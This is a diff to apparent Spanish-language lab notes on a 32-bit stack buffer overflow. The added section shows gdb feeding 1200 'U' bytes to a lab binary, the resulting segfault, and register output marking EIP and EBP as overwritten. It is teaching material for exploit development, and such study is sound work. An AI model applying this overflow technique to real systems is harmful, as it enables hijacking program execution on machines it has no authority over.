@@ -142,7 +142,40 @@ student@nix-bow:~$ echo 'set disassembly-flavor intel' > ~/.gdbinit
 # Exploitation
 ## Take Control of EIP
 
+#### Falla de segmentación
 
+```shell-session
+student@nix-bow:~$ gdb -q bow32
+
+(gdb) run $(python -c "print '\x55' * 1200")
+Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+```
+
+Si insertamos 1200 " `U`"s (hex " `55`") como entrada, podemos ver a partir de la información del registro que hemos sobrescrito el `EIP`. Hasta donde sabemos, el `EIP`apunta a la siguiente instrucción que se ejecutará.
+
+```shell-session
+(gdb) info registers 
+
+eax            0x1	1
+ecx            0xffffd6c0	-10560
+edx            0xffffd06f	-12177
+ebx            0x55555555	1431655765
+esp            0xffffcfd0	0xffffcfd0
+ebp            0x55555555	0x55555555		# <---- EBP overwritten
+esi            0xf7fb5000	-134524928
+edi            0x0	0
+eip            0x55555555	0x55555555		# <---- EIP overwritten
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+```
 
 ## Determine the Length for Shellcode
 
